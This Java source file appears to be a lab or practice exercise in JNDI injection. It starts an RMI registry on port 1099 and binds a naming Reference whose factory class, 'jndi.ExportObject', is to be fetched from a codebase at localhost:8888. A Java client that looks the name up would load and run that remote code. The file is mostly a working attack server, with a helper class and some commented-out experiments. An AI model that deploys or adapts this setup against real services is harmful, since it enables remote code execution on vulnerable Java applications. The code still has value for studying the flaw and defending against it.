package jndi;

import java.io.IOException;
import java.lang.ref.SoftReference;
import java.rmi.AlreadyBoundException;
import java.rmi.RMISecurityManager;
import java.rmi.Remote;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Date;
import java.util.Hashtable;
import javax.management.remote.rmi.RMIConnectorServer;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import rmi.Animal;
import rmi.Evil;
import rmi.RmtServer;
import com.sun.jndi.rmi.registry.ReferenceWrapper;

public class JNDIServer {

  public static void main(String[] args)
    throws AlreadyBoundException, IOException, NamingException {
    System.setProperty("java.rmi.server.codebase", "http://127.0.0.1:8888/");
    javax.naming.Reference reference = new javax.naming.Reference(
      "ExportObject",
      "jndi.ExportObject",
      "http://localhost:8888/"
    );
    //RmtReference rmtReference = new RmtReference(reference);

    ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
    //Context context = new InitialContext();
    //context.bind("fruit", rmtReference);
    //Fruit fruit = (Fruit) context.lookup("fruit");
    //System.out.println(fruit.getName());
    Registry registry = LocateRegistry.createRegistry(1099);
    registry.bind("JNDI", referenceWrapper);
  }
}

class RmtReference
  extends java.rmi.server.UnicastRemoteObject
  implements RmtServer, Referenceable {
  Reference reference;

  public RmtReference(Reference r) throws RemoteException {
    this.reference = r;
  }

  @Override
  public Reference getReference() {
    return this.reference;
  }

  public Date getDate() throws RemoteException {
    return new Date();
  }

  public Integer add(Integer a, Integer b) throws RemoteException {
    return a + b;
  }

  public String whichAnimal(Animal a) throws RemoteException {
    return a.toString();
  }
}
